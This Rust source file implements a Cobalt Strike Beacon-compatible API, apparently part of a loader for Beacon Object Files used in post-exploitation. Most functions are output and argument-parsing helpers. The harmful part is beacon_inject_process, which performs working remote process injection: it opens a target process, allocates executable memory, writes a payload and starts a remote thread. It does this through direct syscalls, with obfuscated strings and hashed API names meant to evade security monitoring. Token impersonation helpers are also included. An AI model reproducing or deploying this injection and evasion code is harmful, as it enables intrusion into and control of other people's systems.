use alloc::string::{String, ToString};
use alloc::vec::Vec;
use core::alloc::Layout;
use core::ptr::{self, null_mut};
use core::ffi::{
    CStr, c_void, c_char, 
    c_int, c_short
};

use spin::Mutex;
use obfstr::obfstr;
use dinvk::syscall;
use dinvk::hash::jenkins3;
use windows_sys::Wdk::Foundation::OBJECT_ATTRIBUTES;
use windows_sys::Win32::System::WindowsProgramming::CLIENT_ID;
use windows_sys::Win32::Foundation::{
    CloseHandle, HANDLE, STATUS_SUCCESS
};
use windows_sys::Win32::Security::{
    GetTokenInformation, RevertToSelf, TOKEN_ELEVATION, 
    TOKEN_QUERY, TokenElevation
};
use windows_sys::Win32::System::Threading::{
    OpenProcessToken, PROCESS_INFORMATION, STARTUPINFOA,
    SetThreadToken, THREAD_ALL_ACCESS, PROCESS_ALL_ACCESS
};
use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE
};

use crate::ffi::NtCurrentProcess;
use crate::error::{Error, Result};

mod pack;
pub use self::pack::BeaconPack;

/// Global output buffer shared by Beacon functions.
static BUFFER: Mutex<OutputBuffer> = Mutex::new(OutputBuffer::new());

/// Collects output produced by Beacon-compatible functions.
///
/// This buffer accumulates output from Beacon API calls and can be retrieved
/// as a formatted string or raw bytes. Zero bytes in the buffer are converted
/// to newlines when displayed.
#[repr(C)]
#[derive(Debug, Clone)]
pub struct OutputBuffer {
    /// Accumulated output bytes as signed chars (C-compatible).
    pub buffer: Vec<c_char>,
}

impl OutputBuffer {
    /// Creates a new empty output buffer.
    const fn new() -> Self {
        Self { buffer: Vec::new() }
    }

    /// Appends raw character data to the buffer.
    ///
    /// Validates the pointer and length before copying data.
    fn append_char(&mut self, s: *mut c_char, len: c_int) {
        if s.is_null() || len <= 0 {
            return;
        }
        let tmp = unsafe { core::slice::from_raw_parts(s, len as usize) };
        self.buffer.extend_from_slice(tmp);
    }

    /// Appends a Rust string to the buffer.
    ///
    /// Converts each byte to a signed char before appending.
    fn append_string(&mut self, s: &str) {
        self.buffer.extend(s.bytes().map(|b| b as c_char));
    }

    /// Returns the buffer contents and size, then clears it.
    ///
    /// The returned pointer is valid until the buffer is modified.
    fn get_output(&mut self) -> (*mut c_char, usize) {
        let size = self.buffer.len();
        let ptr = self.buffer.as_mut_ptr();
        self.buffer.clear();
        (ptr, size)
    }

    /// Clears all accumulated output.
    fn clear(&mut self) {
        self.buffer.clear();
    }
}

impl core::fmt::Display for OutputBuffer {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        let bytes = self.buffer.iter().map(|&c| c as u8).collect::<Vec<u8>>();
        let string = String::from_utf8_lossy(&bytes).replace('\0', "\n");
        write!(f, "{string}")
    }
}

/// Beacon data parser state.
///
/// Tracks position and remaining bytes while extracting values from
/// a serialized Beacon argument buffer.
#[repr(C)]
#[derive(Debug, Clone, Copy)]
struct Data {
    original: *mut c_char,
    buffer: *mut c_char,
    length: c_int,
    size: c_int,
}

/// Beacon format buffer state.
///
/// Manages a dynamically allocated buffer for building formatted output
/// compatible with Beacon's binary format.
#[repr(C)]
#[derive(Debug, Clone, Copy)]
struct Format {
    original: *mut c_char,
    buffer: *mut c_char,
    length: c_int,
    size: c_int,
}

/// Resolves a Beacon API name to its internal function address.
///
/// Uses Jenkins hash to map function names to their runtime addresses.
/// Returns an error if the name doesn't match any known Beacon function.
pub fn get_function_internal_address(name: &str) -> Result<usize> {
    match jenkins3(name) {
        // Output
        3210322847u32 => Ok(beacon_printf as *const () as usize),
        358755801u32 => Ok(beacon_output as *const () as usize),
        2979319955u32 => Ok(beacon_get_output_data as *const () as usize),

        // Token
        3202664826u32 => Ok(beacon_is_admin as *const () as usize),
        233171701u32 => Ok(beacon_use_token as *const () as usize),
        2754379686u32 => Ok(beacon_rever_token as *const () as usize),

        // Format
        1870274128u32 => Ok(beacon_format_int as *const () as usize),
        1617256401u32 => Ok(beacon_format_free as *const () as usize),
        687949845u32 => Ok(beacon_format_alloc as *const () as usize),
        305071883u32 => Ok(beacon_format_reset as *const () as usize),
        2824797381u32 => Ok(beacon_format_printf as *const () as usize),
        814630661u32 => Ok(beacon_format_append as *const () as usize),
        2821454172u32 => Ok(beacon_format_to_string as *const () as usize),

        // Process / injection
        3748796315u32 => Ok(beacon_get_spawn_to as *const () as usize),
        1991785755u32 => Ok(beacon_inject_process as *const () as usize),
        2335479872u32 => Ok(beacon_cleanup_process as *const () as usize),
        2755057638u32 => Ok(beacon_spawn_temporary_process as *const () as usize),
        131483084u32 => Ok(beacon_inject_temporary_process as *const () as usize),

        // Data
        1942020652u32 => Ok(beacon_data_int as *const () as usize),
        1136370979u32 => Ok(beacon_data_short as *const () as usize),
        709123669u32 => Ok(beacon_data_parse as *const () as usize),
        2194280572u32 => Ok(beacon_data_length as *const () as usize),
        596399976u32 => Ok(beacon_data_extract as *const () as usize),
        275872794u32 => Ok(beacon_data_ptr as *const () as usize),

        // Utils
        2580203873u32 => Ok(to_wide_char as *const () as usize),
        3816160102u32 => Ok(0),
        _ => Err(Error::FunctionInternalNotFound(name.to_string())),
    }
}

/// Returns the current Beacon output, clearing the internal buffer.
///
/// After calling this function, the internal buffer is cleared. Returns None
/// if no output has been produced since the last call.
pub fn get_output_data() -> Option<OutputBuffer> {
    let mut beacon = BUFFER.lock();
    if beacon.buffer.is_empty() {
        return None;
    }

    let output = beacon.clone();
    beacon.clear();

    Some(output)
}

/// Allocates a zeroed Format buffer with the specified capacity.
///
/// Initializes the format struct with a heap-allocated buffer of max bytes.
/// If allocation fails or parameters are invalid, the format struct is left unchanged.
fn beacon_format_alloc(format: *mut Format, max: c_int) {
    if format.is_null() || max == 0 {
        return;
    }

    let layout_result = Layout::from_size_align(
        max as usize, 
        Layout::new::<i8>().align()
    );

    if let Ok(layout) = layout_result {
        unsafe {
            let original = alloc::alloc::alloc_zeroed(layout).cast::<i8>();
            (*format).original = original;
            (*format).buffer = original;
            (*format).length = 0;
            (*format).size = max;
        }
    }
}

/// Clears a Format buffer and resets its write pointer.
///
/// Zeroes all bytes in the buffer and moves the write position back to the start.
fn beacon_format_reset(format: *mut Format) {
    if format.is_null() {
        return;
    }

    unsafe {
        ptr::write_bytes((*format).original, 0, (*format).size as usize);
        (*format).buffer = (*format).original;
        (*format).length = (*format).size;
    }
}

/// Returns the Format buffer as a C string pointer with its length.
///
/// Writes the current buffer length to the size pointer and returns the
/// original buffer pointer for use by C code.
fn beacon_format_to_string(format: *mut Format, size: *mut c_int) -> *mut c_char {
    if format.is_null() || size.is_null() {
        return null_mut();
    }

    unsafe {
        (*size) = (*format).length;
        (*format).original
    }
}

/// Appends a big-endian integer to the Format buffer.
///
/// Converts the value to network byte order before writing. Returns early
/// if there is insufficient space remaining in the buffer.
fn beacon_format_int(format: *mut Format, value: c_int) {
    if format.is_null() {
        return;
    }

    unsafe {
        if (*format).length + 4 > (*format).size {
            return;
        }

        let outdata = swap_endianness(value as u32).to_be_bytes();
        ptr::copy_nonoverlapping(outdata.as_ptr(), (*format).buffer as *mut u8, 4);

        (*format).buffer = (*format).buffer.add(4);
        (*format).length += 4;
    }
}

/// Appends raw bytes to the Format buffer.
///
/// Copies len bytes from text to the current buffer position. Returns early
/// if there is insufficient space or invalid parameters.
fn beacon_format_append(format: *mut Format, text: *const c_char, len: c_int) {
    if format.is_null() || text.is_null() || len <= 0 {
        return;
    }

    unsafe {
        if (*format).length + len > (*format).size {
            return;
        }

        ptr::copy_nonoverlapping(text, (*format).buffer, len as usize);
        (*format).buffer = (*format).buffer.add(len as usize);
        (*format).length += len;
    }
}

/// Frees a Format buffer and resets all fields.
///
/// Deallocates the heap buffer and sets all pointers to null.
fn beacon_format_free(format: *mut Format) {
    if format.is_null() {
        return;
    }

    unsafe {
        if !(*format).original.is_null() {
            let layout_result = Layout::from_size_align(
                (*format).size as usize, 
                Layout::new::<i8>().align()
            );
            
            if let Ok(layout) = layout_result {
                alloc::alloc::dealloc((*format).original as *mut u8, layout);
                (*format).original = null_mut();
            }
        }

        (*format).buffer = null_mut();
        (*format).length = 0;
        (*format).size = 0;
    }
}

/// Printf-style formatting into a Format buffer.
///
/// Formats a string according to the C printf format specifier and appends
/// it to the buffer. Returns early if there is insufficient space.
#[unsafe(no_mangle)]
unsafe extern "C" fn beacon_format_printf(format: *mut Format, fmt: *const c_char, args: ...) {
    if format.is_null() || fmt.is_null() {
        return;
    }

    unsafe {
        let fmt = CStr::from_ptr(fmt).to_str().unwrap_or("");
        let mut str = String::new();

        printf_compat::format(
            fmt.as_ptr().cast(), 
            args, 
            printf_compat::output::fmt_write(&mut str)
        );

        let len = str.len() as c_int;
        if (*format).length + len >= (*format).size {
            return;
        }

        ptr::copy_nonoverlapping(
            str.as_ptr() as *const c_char,
            (*format).buffer.add((*format).length as usize),
            len as usize,
        );
    
        (*format).length += len;
    }
}

/// Extracts a 2-byte value from a Data buffer.
///
/// Reads an i16 from the current position and advances the buffer pointer.
/// Returns 0 if there is insufficient data remaining.
fn beacon_data_short(data: *mut Data) -> c_short {
    if data.is_null() {
        return 0;
    }

    let parser = unsafe { &mut *data };
    if parser.length < 2 {
        return 0;
    }

    let result = unsafe { ptr::read_unaligned(parser.buffer as *const i16) };
    parser.buffer = unsafe { parser.buffer.add(2) };
    parser.length -= 2;

    result
}

/// Extracts a 4-byte value from a Data buffer.
///
/// Reads an i32 from the current position and advances the buffer pointer.
/// Returns 0 if there is insufficient data remaining.
fn beacon_data_int(data: *mut Data) -> c_int {
    if data.is_null() {
        return 0;
    }

    let parser = unsafe { &mut *data };
    if parser.length < 4 {
        return 0;
    }

    let result = unsafe { ptr::read_unaligned(parser.buffer as *const i32) };
    parser.buffer = unsafe { parser.buffer.add(4) };
    parser.length -= 4;

    result
}

/// Extracts a length-prefixed blob from a Data buffer.
///
/// Reads a 4-byte length, then returns a pointer to the following data and
/// advances the buffer pointer past it. Writes the blob size to the size pointer.
fn beacon_data_extract(data: *mut Data, size: *mut c_int) -> *mut c_char {
    if data.is_null() {
        return null_mut();
    }

    let parser = unsafe { &mut *data };
    if parser.length < 4 {
        return null_mut();
    }

    let length = unsafe { ptr::read_unaligned(parser.buffer as *const u32) };
    let outdata = unsafe { parser.buffer.add(4) };
    if outdata.is_null() {
        return null_mut();
    }

    parser.buffer = unsafe { parser.buffer.add(4 + length as usize) };
    parser.length -= 4 + length as c_int;
    if !size.is_null() && !outdata.is_null() {
        unsafe {
            *size = length as c_int;
        }
    }

    outdata as *mut c_char
}

/// Initializes a Data parser over a raw buffer.
///
/// Skips the first 4 bytes (typically a length header) and prepares the
/// parser to extract values from the remaining data.
fn beacon_data_parse(data: *mut Data, buffer: *mut c_char, size: c_int) {
    if data.is_null() {
        return;
    }

    unsafe {
        (*data).original = buffer;
        (*data).buffer = buffer.add(4);
        (*data).length = size - 4;
        (*data).size = size - 4;
    }
}

/// Returns the remaining data length in a Data parser.
fn beacon_data_length(data: *const Data) -> c_int {
    if data.is_null() {
        return 0;
    }

    unsafe { (*data).length }
}

/// Returns collected Beacon output as raw bytes.
///
/// Retrieves the accumulated buffer, writes its size to outsize, and clears
/// the internal state. Used by COFF objects to get output data.
fn beacon_get_output_data(outsize: *mut c_int) -> *mut c_char {
    unsafe {
        let mut beacon = BUFFER.lock();
        let (ptr, size) = beacon.get_output();

        if !outsize.is_null() {
            *outsize = size as c_int;
        }

        ptr
    }
}

/// Appends raw output data to the Beacon buffer.
///
/// Adds the specified bytes to the global output buffer for later retrieval.
fn beacon_output(_type: c_int, data: *mut c_char, len: c_int) {
    let mut buffer = BUFFER.lock();
    buffer.append_char(data, len);
}

/// Printf-style output to the Beacon buffer.
///
/// Formats a string according to C printf conventions and appends it to the
/// global output buffer with a null terminator.
#[unsafe(no_mangle)]
unsafe extern "C" fn beacon_printf(_type: c_int, fmt: *mut c_char, args: ...) {
    let mut str = String::new();
    unsafe { 
        printf_compat::format(
            fmt, 
            args, 
            printf_compat::output::fmt_write(&mut str)
        ) 
    };
    
    str.push('\0');

    let mut buffer = BUFFER.lock();
    buffer.append_string(&str);
}

/// Reverts to the original process token.
///
/// Removes any impersonated token and restores the thread's default security context.
fn beacon_rever_token() {
    unsafe {
        if RevertToSelf() == 0 {
            log::warn!("RevertToSelf failed!")
        }
    }
}

/// Applies a token to the current thread.
///
/// Impersonates the specified token for the calling thread. Returns non-zero on success.
fn beacon_use_token(token: HANDLE) -> i32 {
    unsafe { SetThreadToken(null_mut(), token) }
}

/// Closes handles associated with a spawned process.
///
/// Cleans up both the process and thread handles from a PROCESS_INFORMATION structure.
fn beacon_cleanup_process(info: *const PROCESS_INFORMATION) {
    unsafe {
        CloseHandle((*info).hProcess);
        CloseHandle((*info).hThread);
    }
}

/// Checks whether the current process is elevated.
///
/// Queries the process token to determine if it has administrator privileges.
/// Returns 1 if elevated, 0 otherwise.
fn beacon_is_admin() -> u32 {
    let mut h_token = null_mut();
    unsafe {
        if OpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &mut h_token) != 0 {
            let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
            let mut return_length = 0;

            if GetTokenInformation(
                h_token,
                TokenElevation,
                &mut elevation as *mut _ as *mut c_void,
                size_of::<TOKEN_ELEVATION>() as u32,
                &mut return_length,
            ) != 0
            {
                return (elevation.TokenIsElevated == 1) as u32;
            }
        }
    }

    0
}

/// Swaps endianness of a 32-bit integer on little-endian systems.
///
/// On big-endian systems, returns the value unchanged.
fn swap_endianness(src: u32) -> u32 {
    if cfg!(target_endian = "little") {
        src.swap_bytes()
    } else {
        src
    }
}

/// Converts a C-string to UTF-16.
///
/// Encodes the null-terminated source string as UTF-16 and writes it to the
/// destination buffer. Returns 1 on success, 0 if the buffer is too small
/// or parameters are invalid.
fn to_wide_char(src: *const c_char, dst: *mut u16, max: c_int) -> c_int {
    if src.is_null() || dst.is_null() || max < size_of::<u16>() as c_int {
        return 0;
    }

    unsafe {
        let c_str = CStr::from_ptr(src);

        if let Ok(str) = c_str.to_str() {
            let buffer = str.encode_utf16().collect::<Vec<u16>>();
            let dst = core::slice::from_raw_parts_mut(dst, (max as usize) / size_of::<u16>());

            let len = buffer.len();
            if len >= dst.len() {
                return 0;
            }

            dst[..len].copy_from_slice(&buffer);
            dst[len] = 0;
        }
    }

    1
}

/// Performs remote process injection via NT syscalls.
///
/// Opens the target process, allocates executable memory, writes the payload,
/// and creates a remote thread to execute it. All handles are cleaned up on
/// completion or error.
fn beacon_inject_process(
    _h_process: HANDLE, 
    pid: c_int, 
    payload: *const c_char, 
    len: c_int, 
    _offset: c_char, 
    _arg: *const c_char, 
    _a_len: c_int
) {
    if payload.is_null() || len <= 0 {
        return;
    }

    unsafe {
        let mut oa = OBJECT_ATTRIBUTES {
            Length: size_of::<OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: null_mut(),
            ObjectName: null_mut(),
            Attributes: 0,
            SecurityDescriptor: null_mut(),
            SecurityQualityOfService: null_mut(),
        };
        let mut ci = CLIENT_ID {
            UniqueProcess: pid as HANDLE,
            UniqueThread: null_mut(),
        };

        let mut h_process = null_mut::<c_void>();
        let status = syscall!(obfstr!("NtOpenProcess"), &mut h_process, PROCESS_ALL_ACCESS, &mut oa, &mut ci);
        if status != Ok(STATUS_SUCCESS) {
            return;
        }

        let mut size = len as usize;
        let mut address = null_mut::<c_void>();
        let mut status = syscall!(
            obfstr!("NtAllocateVirtualMemory"),
            h_process,
            &mut address,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if status != Ok(STATUS_SUCCESS) {
            CloseHandle(h_process);
            return;
        }

        let mut now = 0usize;
        status = syscall!(obfstr!("NtWriteVirtualMemory"), h_process, address, payload as *const c_void, len as usize, &mut now);
        if status != Ok(STATUS_SUCCESS) {
            CloseHandle(h_process);
            return;
        }

        let mut h_thread = null_mut::<c_void>();
        status = syscall!(
            obfstr!("NtCreateThreadEx"),
            &mut h_thread,
            THREAD_ALL_ACCESS,
            null_mut::<c_void>(),
            h_process,
            address,
            null_mut::<c_void>(),
            0usize,
            0usize,
            0usize,
            0usize,
            null_mut::<c_void>()
        );

        if status != Ok(STATUS_SUCCESS) || h_thread.is_null() {
            CloseHandle(h_process);
            return;
        }

        CloseHandle(h_thread);
        CloseHandle(h_process);
    }
}

/// Extracts a pointer to a region of the Data buffer without copying.
///
/// Advances the buffer pointer by size bytes and returns a pointer to the
/// beginning of that region. Returns null if insufficient data remains.
fn beacon_data_ptr(data: *mut Data, size: c_int) -> *mut c_char {
    if data.is_null() || size <= 0 {
        return null_mut();
    }

    let parser = unsafe { &mut *data };
    if parser.length < size {
        return null_mut();
    }

    let result = parser.buffer;
    parser.buffer = unsafe { parser.buffer.add(size as usize) };
    parser.length -= size;

    result
}

/// Injects code into a temporary process (not yet implemented).
fn beacon_inject_temporary_process(
    _info: *const PROCESS_INFORMATION,
    _payload: *const c_char,
    _len: c_int,
    _offset: c_int,
    _arg: *const c_char,
    _a_len: c_int,
) {
    unimplemented!()
}

/// Spawns a temporary process for injection (not yet implemented).
fn beacon_spawn_temporary_process(
    _x86: i32,
    _ignore_token: i32,
    _s_info: *mut STARTUPINFOA,
    _p_info: *mut PROCESS_INFORMATION
) {
    unimplemented!()
}

/// Retrieves the spawn-to path for a temporary process (not yet implemented).
fn beacon_get_spawn_to(_x86: i32, _buffer: *const c_char, _length: c_int) {
    unimplemented!()
}


